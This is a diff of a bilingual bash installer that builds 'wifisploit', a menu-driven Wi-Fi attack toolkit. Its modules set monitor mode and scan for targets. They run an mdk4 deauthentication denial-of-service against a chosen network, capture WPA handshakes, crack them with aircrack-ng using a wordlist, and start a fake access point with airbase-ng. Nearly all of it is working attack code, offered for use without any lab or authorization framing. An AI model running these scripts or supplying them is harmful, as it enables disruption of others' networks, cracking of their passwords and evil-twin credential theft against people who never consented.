@@ -1,7 +1,23 @@
 #!/bin/bash
 
+# 检查必要工具是否已安装
+REQUIRED_TOOLS=("airmon-ng" "airodump-ng" "aircrack-ng" "mdk4")
+MISSING_TOOLS=()
+
+for tool in "${REQUIRED_TOOLS[@]}"; do
+  if ! command -v $tool &> /dev/null; then
+    MISSING_TOOLS+=($tool)
+  fi
+done
+
+if [ ${#MISSING_TOOLS[@]} -ne 0 ]; then
+  echo "以下工具未安装，请先安装它们: ${MISSING_TOOLS[@]}"
+  exit 1
+fi
+
 # 创建目录结构
 mkdir -p wifisploit/modules
+mkdir -p /tmp/wifisploit/fake_ap
 
 # 选择语言版本
 echo "Select language (选择语言):"
@@ -41,7 +57,7 @@ fi
 
 airmon-ng start \$INTERFACE
 
-MONITOR_INTERFACE=\$(iw dev | awk '\$1=="Interface"{print \$2}' | grep -E "^mon")
+MONITOR_INTERFACE=\$(iw dev | awk '\$1=="Interface"{print \$2}' | grep -E "\$INTERFACE|mon\$INTERFACE")
 
 if [ -z "\$MONITOR_INTERFACE" ]; then
   if [ "$LANG_SUFFIX" == "_zh" ]; then
@@ -52,18 +68,27 @@ if [ -z "\$MONITOR_INTERFACE" ]; then
   exit 1
 fi
 
+echo \$MONITOR_INTERFACE > /tmp/current_monitor_interface
+
 if [ "$LANG_SUFFIX" == "_zh" ]; then
   echo "\$INTERFACE 已设置为监听模式 \$MONITOR_INTERFACE"
 else
   echo "\$INTERFACE is now in monitor mode as \$MONITOR_INTERFACE"
 fi
-
-echo \$MONITOR_INTERFACE > /tmp/current_monitor_interface
 EOF
 
 # 创建 scan_networks.sh
 cat << EOF > wifisploit/modules/scan_networks.sh
 #!/bin/bash
+
+if [ ! -f /tmp/current_monitor_interface ]; then
+  if [ "$LANG_SUFFIX" == "_zh" ]; then
+    echo "请先将网卡设置为监听模式。"
+  else
+    echo "Please set the interface to monitor mode first."
+  fi
+  exit 1
+fi
 
 MONITOR_INTERFACE=\$(cat /tmp/current_monitor_interface)
 
@@ -84,9 +109,21 @@ fi
 
 airodump-ng \$MONITOR_INTERFACE > /tmp/network_scan.txt &
 
-sleep 10  # 扫描10秒
+sleep 20  # 扫描20秒
 
 kill \$!
+
+# 检查是否有扫描结果
+NETWORKS=\$(awk '/^[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}/ {print \$1}' /tmp/network_scan.txt)
+
+if [ -z "\$NETWORKS" ]; then
+  if [ "$LANG_SUFFIX" == "_zh" ]; then
+    echo "未发现任何网络，请重试。"
+  else
+    echo "No networks found, please try again."
+  fi
+  exit 1
+fi
 
 # 显示扫描结果并让用户选择目标
 awk 'BEGIN{if ("$LANG_SUFFIX" == "_zh") print "编号\tBSSID\t\t\t频道\t加密\t信号\tSSID"; else print "Num\tBSSID\t\t\tChannel\tEncryption\tSignal\tSSID"} /^[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}/ {printf "%d\t%s\t%s\t%s\t%s\t%s\n", NR, \$1, \$6, \$8, \$4, \$14}' /tmp/network_scan.txt
@@ -99,6 +136,15 @@ fi
 
 TARGET_BSSID=\$(awk -v num=\$TARGET_NUMBER 'BEGIN{FS="\t"} NR==num+1 {print \$2}' /tmp/network_scan.txt)
 TARGET_CHANNEL=\$(awk -v num=\$TARGET_NUMBER 'BEGIN{FS="\t"} NR==num+1 {print \$3}' /tmp/network_scan.txt)
+
+if [ -z "\$TARGET_BSSID" ] || [ -z "\$TARGET_CHANNEL" ]; then
+  if [ "$LANG_SUFFIX" == "_zh" ]; then
+    echo "选择的目标网络编号无效，请重试。"
+  else
+    echo "Invalid target network number selected, please try again."
+  fi
+  exit 1
+fi
 
 echo \$TARGET_BSSID > /tmp/current_target_bssid
 echo \$TARGET_CHANNEL > /tmp/current_target_channel
@@ -114,11 +160,20 @@ EOF
 cat << EOF > wifisploit/modules/dos_attack.sh
 #!/bin/bash
 
+if [ ! -f /tmp/current_monitor_interface ]; then
+  if [ "$LANG_SUFFIX" == "_zh" ];then
+    echo "请先将网卡设置为监听模式。"
+  else
+    echo "Please set the interface to monitor mode first."
+  fi
+  exit 1
+fi
+
 MONITOR_INTERFACE=\$(cat /tmp/current_monitor_interface)
 TARGET_BSSID=\$(cat /tmp/current_target_bssid)
 
 if [ -z "\$MONITOR_INTERFACE" ] || [ -z "\$TARGET_BSSID" ]; then
-  if [ "$LANG_SUFFIX" == "_zh" ]; then
+  if [ "$LANG_SUFFIX" == "_zh" ];then
     echo "请先选择目标网络。"
   else
     echo "Please select a target network first."
@@ -126,25 +181,34 @@ if [ -z "\$MONITOR_INTERFACE" ] || [ -z "\$TARGET_BSSID" ]; then
   exit 1
 fi
 
-if [ "$LANG_SUFFIX" == "_zh" ]; then
+if [ "$LANG_SUFFIX" == "_zh" ];then
   echo "开始对目标网络进行Dos攻击..."
 else
   echo "Starting Dos attack on the target network..."
 fi
 
-aireplay-ng --deauth 0 -a \$TARGET_BSSID \$MONITOR_INTERFACE
+mdk4 \$MONITOR_INTERFACE d -t \$TARGET_BSSID
 EOF
 
 # 创建 capture_handshake.sh
 cat << EOF > wifisploit/modules/capture_handshake.sh
 #!/bin/bash
 
+if [ ! -f /tmp/current_monitor_interface ]; then
+  if [ "$LANG_SUFFIX" == "_zh" ];then
+    echo "请先将网卡设置为监听模式。"
+  else
+    echo "Please set the interface to monitor mode first."
+  fi
+  exit 1
+fi
+
 MONITOR_INTERFACE=\$(cat /tmp/current_monitor_interface)
 TARGET_BSSID=\$(cat /tmp/current_target_bssid)
 TARGET_CHANNEL=\$(cat /tmp/current_target_channel)
 
 if [ -z "\$MONITOR_INTERFACE" ] || [ -z "\$TARGET_BSSID" ] || [ -z "\$TARGET_CHANNEL" ]; then
-  if [ "$LANG_SUFFIX" == "_zh" ]; then
+  if [ "$LANG_SUFFIX" == "_zh" ];then
     echo "请先选择目标网络。"
   else
     echo "Please select a target network first."
@@ -152,66 +216,35 @@ if [ -z "\$MONITOR_INTERFACE" ] || [ -z "\$TARGET_BSSID" ] || [ -z "\$TARGET_CHA
   exit 1
 fi
 
-if [ "$LANG_SUFFIX" == "_zh" ]; then
-  echo "开始对目标网络进行监视以查找连接的设备..."
+if [ "$LANG_SUFFIX" == "_zh" ];then
+  echo "开始捕获目标网络的握手包..."
 else
-  echo "Starting monitoring the target network to find connected devices..."
+  echo "Starting to capture handshake from the target network..."
 fi
 
-airodump-ng --bssid \$TARGET_BSSID --channel \$TARGET_CHANNEL --write capture --output-format csv \$MONITOR_INTERFACE &
+airodump-ng --bssid \$TARGET_BSSID --channel \$TARGET_CHANNEL --write /tmp/capture \$MONITOR_INTERFACE &
 
 AIRODUMP_PID=\$!
 
-sleep 10  # 监视10秒以查找连接的设备
+sleep 20  # 监视20秒以捕获握手包
 
 kill \$AIRODUMP_PID
 
-# 检查是否找到连接的设备
-CLIENT_MACS=\$(awk -F, '/Station MAC/ {found=1} found && \$1 ~ /^[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}:[0-9A-F]{2}/ {print \$1}' capture-01.csv)
-
-if [ -z "\$CLIENT_MACS" ]; then
-  if [ "$LANG_SUFFIX" == "_zh" ]; then
-    echo "未找到连接到目标网络的设备。"
+if [ ! -f /tmp/capture-01.cap ]; then
+  if [ "$LANG_SUFFIX" == "_zh" ];then
+    echo "未能捕获到握手包。"
   else
-    echo "No devices found connected to the target network."
+    echo "Failed to capture handshake."
   fi
   exit 1
 fi
 
-# 随机选择一台设备进行踢出
-CLIENT_MAC=\$(echo "\$CLIENT_MACS" | shuf -n 1)
+mv /tmp/capture-01.cap /tmp/handshake.cap
 
-if [ "$LANG_SUFFIX" == "_zh" ]; then
-  echo "踢出目标网络中的设备 \$CLIENT_MAC 以获取握手包..."
+if [ "$LANG_SUFFIX" == "_zh" ];then
+  echo "握手包已成功捕获并保存到 /tmp/handshake.cap"
 else
-  echo "Kicking off device \$CLIENT_MAC from the target network to capture the handshake..."
-fi
-
-aireplay-ng --deauth 5 -a \$TARGET_BSSID -c \$CLIENT_MAC \$MONITOR_INTERFACE
-
-# 继续监视目标网络以捕获握手包
-airodump-ng --bssid \$TARGET_BSSID --channel \$TARGET_CHANNEL --write capture \$MONITOR_INTERFACE &
-
-AIRODUMP_PID=\$!
-
-sleep 10  # 继续监视10秒
-
-kill \$AIRODUMP_PID
-
-# 检查是否已捕获到握手包
-if [ -f capture-01.cap ]; then
-  if [ "$LANG_SUFFIX" == "_zh" ]; then
-    echo "成功捕获到握手包，保存在 capture-01.cap"
-  else
-    echo "Successfully captured handshake, saved as capture-01.cap"
-  fi
-else
-  if [ "$LANG_SUFFIX" == "_zh" ]; then
-    echo "未捕获到握手包，请重试或检查目标网络状态。"
-  else
-    echo "Failed to capture handshake, please retry or check the target network status."
-  fi
-  exit 1
+  echo "Handshake successfully captured and saved to /tmp/handshake.cap"
 fi
 EOF
 
@@ -219,12 +252,10 @@ EOF
 cat << EOF > wifisploit/modules/crack_handshake.sh
 #!/bin/bash
 
-CAPTURE_FILE="capture-01.cap"
-TARGET_BSSID=\$(cat /tmp/current_target_bssid)
 DICTIONARY_PATH=\$1
 
 if [ -z "\$DICTIONARY_PATH" ]; then
-  if [ "$LANG_SUFFIX" == "_zh" ]; then
+  if [ "$LANG_SUFFIX" == "_zh" ];then
     echo "用法: \$0 <dictionary_path>"
   else
     echo "Usage: \$0 <dictionary_path>"
@@ -232,49 +263,45 @@ if [ -z "\$DICTIONARY_PATH" ]; then
   exit 1
 fi
 
-if [ ! -f "\$CAPTURE_FILE" ]; then
-  if [ "$LANG_SUFFIX" == "_zh" ]; then
-    echo "握手包文件 \$CAPTURE_FILE 不存在。"
+if [ ! -f "\$DICTIONARY_PATH" ]; then
+  if [ "$LANG_SUFFIX" == "_zh" ];then
+    echo "字典文件不存在，请检查路径。"
   else
-    echo "Handshake file \$CAPTURE_FILE does not exist."
+    echo "Dictionary file not found, please check the path."
   fi
   exit 1
 fi
 
-if [ "$LANG_SUFFIX" == "_zh" ]; then
+CAPTURE_FILE=/tmp/handshake.cap
+
+if [ ! -f "\$CAPTURE_FILE" ]; then
+  if [ "$LANG_SUFFIX" == "_zh" ];then
+    echo "未找到捕获的握手包，请先捕获握手包。"
+  else
+    echo "Capture file not found, please capture the handshake first."
+  fi
+  exit 1
+fi
+
+if [ "$LANG_SUFFIX" == "_zh" ];then
   echo "开始破解握手包..."
 else
   echo "Starting to crack the handshake..."
 fi
 
-aircrack-ng -w \$DICTIONARY_PATH -b \$TARGET_BSSID \$CAPTURE_FILE
-
-if [ "$?" -eq 0 ]; then
-  if [ "$LANG_SUFFIX" == "_zh" ]; then
-    echo "握手包破解成功。"
-  else
-    echo "Successfully cracked the handshake."
-  fi
-else
-  if [ "$LANG_SUFFIX" == "_zh" ]; then
-    echo "未能破解握手包，请检查字典文件并重试。"
-  else
-    echo "Failed to crack the handshake, please check the dictionary file and retry."
-  fi
-  exit 1
-fi
+aircrack-ng -w \$DICTIONARY_PATH \$CAPTURE_FILE
 EOF
 
 # 创建 create_fake_ap.sh
 cat << EOF > wifisploit/modules/create_fake_ap.sh
 #!/bin/bash
 
-FAKE_AP_INTERFACE=\$1
-FAKE_AP_SSID=\$2
-FAKE_AP_CHANNEL=\$3
+AP_INTERFACE=\$1
+AP_SSID=\$2
+AP_CHANNEL=\$3
 
-if [ -z "\$FAKE_AP_INTERFACE" ] || [ -z "\$FAKE_AP_SSID" ] || [ -z "\$FAKE_AP_CHANNEL" ]; then
-  if [ "$LANG_SUFFIX" == "_zh" ]; then
+if [ -z "\$AP_INTERFACE" ] || [ -z "\$AP_SSID" ] || [ -z "\$AP_CHANNEL" ]; then
+  if [ "$LANG_SUFFIX" == "_zh" ];then
     echo "用法: \$0 <interface> <SSID> <channel>"
   else
     echo "Usage: \$0 <interface> <SSID> <channel>"
@@ -282,99 +309,111 @@ if [ -z "\$FAKE_AP_INTERFACE" ] || [ -z "\$FAKE_AP_SSID" ] || [ -z "\$FAKE_AP_CH
   exit 1
 fi
 
-if [ "$LANG_SUFFIX" == "_zh" ]; then
-  echo "创建假AP，SSID: \$FAKE_AP_SSID，频道: \$FAKE_AP_CHANNEL..."
+if [ "$LANG_SUFFIX" == "_zh" ];then
+  echo "创建假的AP: SSID=\$AP_SSID, 频道=\$AP_CHANNEL, 接口=\$AP_INTERFACE..."
 else
-  echo "Creating fake AP with SSID: \$FAKE_AP_SSID, Channel: \$FAKE_AP_CHANNEL..."
+  echo "Creating fake AP: SSID=\$AP_SSID, Channel=\$AP_CHANNEL, Interface=\$AP_INTERFACE..."
 fi
 
-# 配置 hostapd
-cat << EOL > /tmp/wifisploit/fake_ap/hostapd.conf
-interface=\$FAKE_AP_INTERFACE
-driver=nl80211
-ssid=\$FAKE_AP_SSID
-channel=\$FAKE_AP_CHANNEL
-hw_mode=g
-auth_algs=1
-wpa=2
-wpa_key_mgmt=WPA-PSK
-wpa_pairwise=TKIP CCMP
-wpa_passphrase=Password123
-EOL
-
-# 启动 hostapd
-hostapd /tmp/wifisploit/fake_ap/hostapd.conf &
-HOSTAPD_PID=\$!
-
-sleep 5
-
-# 配置 dnsmasq
-cat << EOL > /tmp/wifisploit/fake_ap/dnsmasq.conf
-interface=\$FAKE_AP_INTERFACE
-dhcp-range=10.10.0.10,10.10.0.50,12h
-dhcp-option=3,10.10.0.1
-dhcp-option=6,10.10.0.1
-EOL
-
-# 启动 dnsmasq
-dnsmasq -C /tmp/wifisploit/fake_ap/dnsmasq.conf
-
-if [ "$LANG_SUFFIX" == "_zh" ]; then
-  echo "假AP已创建并运行。"
-else
-  echo "Fake AP created and running."
-fi
-
-trap "kill \$HOSTAPD_PID; exit" SIGINT
-wait \$HOSTAPD_PID
+# 使用airbase-ng创建假AP
+airbase-ng -e \$AP_SSID -c \$AP_CHANNEL \$AP_INTERFACE
 EOF
 
-# 赋予执行权限
-chmod +x wifisploit/modules/*.sh
-
-# 创建主脚本
+# 创建主脚本 wifisploit.sh
 cat << EOF > wifisploit/wifisploit.sh
 #!/bin/bash
 
-# 选择模块
-echo "Select module (选择模块):"
-echo "1) Set Monitor Mode"
-echo "2) Scan Networks"
-echo "3) DOS Attack"
-echo "4) Capture Handshake"
-echo "5) Crack Handshake"
-echo "6) Create Fake AP"
-read -p "Enter choice: " module_choice
+while true; do
+  # 选择模块
+  if [ "$LANG_SUFFIX" == "_zh" ];then
+    echo "选择模块:"
+    echo "1) 设置监听模式 - 将无线网卡设置为监听模式以捕获数据包。"
+    echo "2) 扫描网络 - 扫描周围的Wi-Fi网络。"
+    echo "3) DOS攻击 - 对目标网络进行拒绝服务攻击。"
+    echo "4) 捕获握手包 - 捕获目标网络的握手包。"
+    echo "5) 破解握手包 - 使用字典文件破解捕获的握手包。"
+    echo "6) 创建假的AP - 创建一个假的Wi-Fi接入点。"
+    echo "7) 退出 - 退出脚本。"
+    read -p "输入选择: " module_choice
+  else
+    echo "Select module:"
+    echo "1) Set Monitor Mode - Set the wireless interface to monitor mode to capture packets."
+    echo "2) Scan Networks - Scan surrounding Wi-Fi networks."
+    echo "3) DOS Attack - Perform a denial-of-service attack on the target network."
+    echo "4) Capture Handshake - Capture handshake packets from the target network."
+    echo "5) Crack Handshake - Crack the captured handshake using a dictionary file."
+    echo "6) Create Fake AP - Create a fake Wi-Fi access point."
+    echo "7) Exit - Exit the script."
+    read -p "Enter choice: " module_choice
+  fi
 
-case \$module_choice in
-  1)
-    wifisploit/modules/set_monitor_mode.sh
-    ;;
-  2)
-    wifisploit/modules/scan_networks.sh
-    ;;
-  3)
-    wifisploit/modules/dos_attack.sh
-    ;;
-  4)
-    wifisploit/modules/capture_handshake.sh
-    ;;
-  5)
-    read -p "Enter dictionary path: " dict_path
-    wifisploit/modules/crack_handshake.sh \$dict_path
-    ;;
-  6)
-    read -p "Enter interface: " ap_interface
-    read -p "Enter SSID: " ap_ssid
-    read -p "Enter channel: " ap_channel
-    wifisploit/modules/create_fake_ap.sh \$ap_interface \$ap_ssid \$ap_channel
-    ;;
-  *)
-    echo "Invalid choice"
-    ;;
-esac
+  case \$module_choice in
+    1)
+      if [ "$LANG_SUFFIX" == "_zh" ];then
+        read -p "输入接口（如 wlan0）: " interface
+      else
+        read -p "Enter interface (e.g., wlan0): " interface
+      fi
+      ./modules/set_monitor_mode.sh \$interface
+      ;;
+    2)
+      ./modules/scan_networks.sh
+      ;;
+    3)
+      ./modules/dos_attack.sh
+      ;;
+    4)
+      ./modules/capture_handshake.sh
+      ;;
+    5)
+      if [ "$LANG_SUFFIX" == "_zh" ];then
+        read -p "输入字典路径: " dict_path
+      else
+        read -p "Enter dictionary path: " dict_path
+      fi
+      ./modules/crack_handshake.sh \$dict_path
+      ;;
+    6)
+      if [ "$LANG_SUFFIX" == "_zh" ];then
+        read -p "输入SSID: " ap_ssid
+        read -p "输入频道: " ap_channel
+      else
+        read -p "Enter SSID: " ap_ssid
+        read -p "Enter channel: " ap_channel
+      fi
+      ./modules/create_fake_ap.sh \$(cat /tmp/current_monitor_interface) \$ap_ssid \$ap_channel
+      ;;
+    7)
+      if [ "$LANG_SUFFIX" == "_zh" ];then
+        echo "退出..."
+      else
+        echo "Exiting..."
+      fi
+      exit 0
+      ;;
+    *)
+      if [ "$LANG_SUFFIX" == "_zh" ];then
+        echo "无效的选择"
+      else
+        echo "Invalid choice"
+      fi
+      ;;
+  esac
+
+  if [ "$LANG_SUFFIX" == "_zh" ];then
+    echo "返回主菜单..."
+  else
+    echo "Returning to main menu..."
+  fi
+done
 EOF
 
+# 设置脚本可执行权限
+chmod +x wifisploit/modules/*.sh
 chmod +x wifisploit/wifisploit.sh
 
-echo "Installation completed. To run wifisploit, use: ./wifisploit/wifisploit.sh"
+if [ "$LANG_SUFFIX" == "_zh" ];then
+  echo "部署完成！运行 ./wifisploit/wifisploit.sh 启动脚本。"
+else
+  echo "Deployment complete! Run ./wifisploit/wifisploit.sh to start the script."
+fi
